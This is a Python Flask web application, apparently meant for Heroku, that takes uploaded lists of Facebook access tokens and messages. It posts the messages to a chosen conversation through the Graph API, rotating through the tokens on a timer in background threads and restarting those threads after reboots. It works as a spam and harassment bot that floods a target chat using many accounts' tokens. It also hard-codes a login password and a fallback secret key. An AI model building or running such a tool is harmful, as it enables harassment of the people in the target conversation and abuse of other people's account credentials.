from flask import Flask, request, render_template, redirect, session, url_for, jsonify
import os, threading, requests, time, json
from datetime import datetime
from flask_sqlalchemy import SQLAlchemy  # NEW: Database
import psycopg2  # NEW: PostgreSQL support

app = Flask(__name__)

# ✅ HEROKU CONFIGURATION
# Get secret key from environment variable (more secure)
app.secret_key = os.environ.get('SECRET_KEY', 'Royalkinghere09')
app.config['UPLOAD_FOLDER'] = 'uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# ✅ DATABASE SETUP FOR HEROKU
# Fix Heroku PostgreSQL URL (Heroku gives postgres:// but SQLAlchemy needs postgresql://)
database_url = os.environ.get('DATABASE_URL')
if database_url:
    if database_url.startswith('postgres://'):
        database_url = database_url.replace('postgres://', 'postgresql://', 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
else:
    # For local development
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///tasks.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ✅ DATABASE MODEL
class Task(db.Model):
    id = db.Column(db.String(16), primary_key=True)
    task_name = db.Column(db.String(100))
    task_password = db.Column(db.String(100))
    prefix = db.Column(db.String(200))
    convo_id = db.Column(db.String(100))
    speed = db.Column(db.Integer)
    token_list = db.Column(db.Text)  # Store as JSON string
    message_list = db.Column(db.Text)  # Store as JSON string
    status = db.Column(db.String(20), default='running')  # 'running' or 'stopped'
    start_time = db.Column(db.DateTime)
    created_at = db.Column(db.DateTime, default=datetime.now)

# Create tables
with app.app_context():
    db.create_all()

# ✅ MEMORY VARIABLES (for active tasks)
tasks = {}
stop_flags = {}
start_times = {}
task_info = {}
task_stats = {}

# ✅ DATABASE FUNCTIONS
def save_task_to_db(unique_id, task_data, start_time):
    """Save or update task in database"""
    with app.app_context():
        task = Task.query.get(unique_id)
        if not task:
            task = Task(id=unique_id)
        
        task.task_name = task_data["task_name"]
        task.task_password = task_data["task_password"]
        task.prefix = task_data["prefix"]
        task.convo_id = task_data["convo_id"]
        task.speed = task_data["speed"]
        task.token_list = json.dumps(task_data["token_list"])
        task.message_list = json.dumps(task_data["message_list"])
        task.status = 'running'
        task.start_time = start_time
        
        db.session.add(task)
        db.session.commit()
        print(f"✅ Task {unique_id} saved to database")

def update_task_status_in_db(unique_id, status):
    """Update task status in database"""
    with app.app_context():
        task = Task.query.get(unique_id)
        if task:
            task.status = status
            db.session.commit()
            print(f"✅ Task {unique_id} status updated to '{status}' in database")

def delete_task_from_db(unique_id):
    """Delete task from database (when permanently stopped)"""
    with app.app_context():
        task = Task.query.get(unique_id)
        if task:
            db.session.delete(task)
            db.session.commit()
            print(f"✅ Task {unique_id} deleted from database")

def load_running_tasks_from_db():
    """Load all running tasks from database"""
    with app.app_context():
        tasks_from_db = Task.query.filter_by(status='running').all()
        result = []
        
        for db_task in tasks_from_db:
            try:
                result.append({
                    'id': db_task.id,
                    'task_name': db_task.task_name,
                    'task_password': db_task.task_password,
                    'prefix': db_task.prefix,
                    'convo_id': db_task.convo_id,
                    'speed': db_task.speed,
                    'token_list': json.loads(db_task.token_list),
                    'message_list': json.loads(db_task.message_list),
                    'start_time': db_task.start_time
                })
            except:
                continue
        return result

# ✅ HELPER FUNCTIONS
def get_uid():
    return os.urandom(8).hex()

def convo_task(unique_id, token_list, message_list, convo_id, prefix, speed, task_name, task_password):
    """Main task function with database support"""
    # Initialize memory variables
    tasks[unique_id] = threading.current_thread()
    stop_flags[unique_id] = False
    start_times[unique_id] = datetime.now()
    
    task_data = {
        "task_name": task_name,
        "task_password": task_password,
        "prefix": prefix,
        "convo_id": convo_id,
        "speed": speed,
        "token_list": token_list,
        "message_list": message_list
    }
    
    task_info[unique_id] = task_data
    task_stats[unique_id] = {
        "total_tokens": len(token_list),
        "failed_tokens": 0,
        "successful_tokens": 0,
        "current_token": None,
    }
    
    # ✅ SAVE TO DATABASE (Persist through restarts)
    save_task_to_db(unique_id, task_data, start_times[unique_id])
    
    print(f"[{datetime.now()}] Task {unique_id} started.")
    
    # Main task loop
    token_index = 0
    message_index = 0
    
    while not stop_flags.get(unique_id, True):
        try:
            token = token_list[token_index]
            message = message_list[message_index]
            full_message = f"{prefix} {message.strip()}"
            
            task_stats[unique_id]["current_token"] = token
            
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            params = {'access_token': token, 'message': full_message}
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            response = requests.post(url, json=params, headers=headers)
            
            if response.status_code == 200:
                task_stats[unique_id]["successful_tokens"] += 1
                print(f"\033[92m[{datetime.now()}] Message sent: {full_message}\033[0m")
            else:
                task_stats[unique_id]["failed_tokens"] += 1
                print(f"\033[91m[{datetime.now()}] Failed to send: {full_message} | Status: {response.status_code}\033[0m")
            
            token_index = (token_index + 1) % len(token_list)
            message_index = (message_index + 1) % len(message_list)
            time.sleep(speed)
            
        except Exception as e:
            task_stats[unique_id]["failed_tokens"] += 1
            print(f"\033[91m[{datetime.now()}] Error: {e}\033[0m")
            time.sleep(speed)
    
    print(f"[{datetime.now()}] Task {unique_id} stopped.")
    
    # ✅ Update database status to 'stopped' (but keep record)
    update_task_status_in_db(unique_id, 'stopped')
    
    # Clean up memory
    for dict_name in [task_info, start_times, stop_flags, tasks, task_stats]:
        if unique_id in dict_name:
            del dict_name[unique_id]

# ✅ RESTART FUNCTION (Loads tasks after Heroku restart)
def restart_saved_tasks():
    """Restart all running tasks from database after server restart"""
    print("🔄 Checking for tasks to restart from database...")
    
    running_tasks = load_running_tasks_from_db()
    
    if not running_tasks:
        print("✅ No running tasks found in database")
        return
    
    print(f"✅ Found {len(running_tasks)} running task(s) in database")
    
    for task_data in running_tasks:
        task_id = task_data['id']
        
        if task_id not in tasks:  # Only restart if not already running
            print(f"🔄 Restarting task: {task_data['task_name']} (ID: {task_id})")
            
            # Start the task thread
            thread = threading.Thread(
                target=convo_task,
                args=(
                    task_id,
                    task_data['token_list'],
                    task_data['message_list'],
                    task_data['convo_id'],
                    task_data['prefix'],
                    task_data['speed'],
                    task_data['task_name'],
                    task_data['task_password']
                )
            )
            thread.start()
            
            # Simulate original start time
            start_times[task_id] = task_data['start_time']
            
            time.sleep(1)  # Small delay between restarts

# ✅ LOGIN DECORATOR
from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ✅ ROUTES
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'S4H1L' and password == '123123':
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            error = 'Invalid Credentials. Please try again.'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
@login_required
def index():
    if request.method == 'POST':
        task_name = request.form['task_name'].strip()
        task_password = request.form['task_password'].strip()
        token_file = request.files['token_file']
        message_file = request.files['message_file']
        convo_id = request.form['convo_id'].strip()
        prefix = request.form['prefix'].strip()
        speed = int(request.form['speed'])
        
        # Save uploaded files
        token_path = os.path.join(app.config['UPLOAD_FOLDER'], f'tokens_{datetime.now().timestamp()}.txt')
        message_path = os.path.join(app.config['UPLOAD_FOLDER'], f'messages_{datetime.now().timestamp()}.txt')
        
        token_file.save(token_path)
        message_file.save(message_path)
        
        # Read files
        with open(token_path, 'r') as tf:
            token_list = [line.strip() for line in tf if line.strip()]
        
        with open(message_path, 'r') as mf:
            message_list = [line.strip() for line in mf if line.strip()]
        
        # Clean up uploaded files (optional)
        try:
            os.remove(token_path)
            os.remove(message_path)
        except:
            pass
        
        # Generate unique ID and start task
        unique_id = get_uid()
        thread = threading.Thread(
            target=convo_task,
            args=(unique_id, token_list, message_list, convo_id, prefix, speed, task_name, task_password)
        )
        thread.start()
        
        return redirect('/')
    
    # Display running tasks
    running_tasks = []
    for task_id in tasks.keys():
        if not stop_flags.get(task_id, True):  # Only show active tasks
            uptime = datetime.now() - start_times[task_id]
            info = task_info.get(task_id, {})
            stats = task_stats.get(task_id, {})
            
            running_tokens = stats.get("successful_tokens", 0)
            failed_tokens = stats.get("failed_tokens", 0)
            total_tokens = stats.get("total_tokens", 0)
            total_messages = running_tokens + failed_tokens
            
            running_tasks.append({
                "id": task_id,
                "task_name": info.get("task_name", ""),
                "prefix": info.get("prefix", ""),
                "uptime": str(uptime).split('.')[0],
                "total_tokens": total_tokens,
                "total_messages": total_messages,
                "failed_tokens": failed_tokens,
                "running_tokens": running_tokens
            })
    
    return render_template('index.html', running_tasks=running_tasks)

@app.route('/stop/<task_id>', methods=['POST'])
@login_required
def stop(task_id):
    password = request.form.get('password', '')
    
    # Check in memory first
    if task_id in task_info:
        if task_info[task_id]["task_password"] == password:
            stop_flags[task_id] = True
            # Database status will be updated when thread finishes
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "Wrong password"})
    
    # Also check in database for stopped tasks
    with app.app_context():
        db_task = Task.query.get(task_id)
        if db_task:
            if db_task.task_password == password:
                # Task might be in database but not in memory (after restart)
                update_task_status_in_db(task_id, 'stopped')
                return jsonify({"success": True, "message": "Task was already stopped"})
    
    return jsonify({"success": False, "error": "Task not found"})

# ✅ HEROKU MAIN ENTRY POINT
if __name__ == '__main__':
    # Restart any saved tasks from database
    restart_saved_tasks()
    
    # Get port from Heroku environment variable
    port = int(os.environ.get('PORT', 20065))
    
    # Heroku requires 0.0.0.0 binding
    host = '0.0.0.0'
    
    print(f"🚀 Server starting on {host}:{port}")
    print(f"📊 Database: {app.config['SQLALCHEMY_DATABASE_URI'].split('@')[0]}...")
    
    app.run(host=host, port=port, debug=False)
